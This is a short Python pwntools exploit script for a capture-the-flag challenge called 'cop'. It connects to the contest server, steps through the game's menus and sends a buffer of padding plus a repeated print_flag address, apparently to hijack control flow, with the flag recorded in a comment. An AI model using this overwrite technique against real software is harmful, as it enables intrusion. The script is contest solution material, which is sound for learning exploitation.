#flag = ICHSA_CTF{exploitation_with_cop_is_why_better_than_any_crime}
from pwn import *
#script written by @manish

# p = process("./game")
p = remote("cop.ichsa.ctf.today", 8011)
#p = remote("localhost",6666)

print_flag = 0x401813

p.sendlineafter("[","2")
p.sendlineafter("[","3")
p.sendlineafter("[","2")
p.sendlineafter("[","3")
p.sendlineafter("[","2")
p.sendlineafter("[","2")
p.sendlineafter("[","2")
p.sendlineafter("[","3")
p.sendlineafter("[","2")
p.sendlineafter("[","1")

p.sendlineafter("[","4")

p.sendlineafter("[","5")
p.sendlineafter(":","AAAAAA"+p64(print_flag)*124)

p.sendlineafter("[","3")
p.sendlineafter("[",str(0xff))
p.sendlineafter("[",str(3))
p.sendlineafter("[",str(0xff))
p.sendlineafter("[",str(3))
p.sendlineafter("[",str(0xff))
p.sendlineafter("[",str(3))
p.sendlineafter("[",str(0xff))
p.sendlineafter("[",str(3))
p.sendlineafter("[",str(0xff))
p.sendlineafter("[",str(3))
p.sendlineafter("[",str(0xff))
p.sendlineafter("[",str(3))
p.sendlineafter("[",str(0xff))
p.sendlineafter("[",str(3))
p.sendlineafter("[",str(0xff))
p.sendlineafter("[",str(3))
p.sendlineafter("[",str(0xb0))
p.sendlineafter("[",str(2))
p.sendlineafter("[",str(2))
print(p.recvall(timeout=1))

#p.interactive()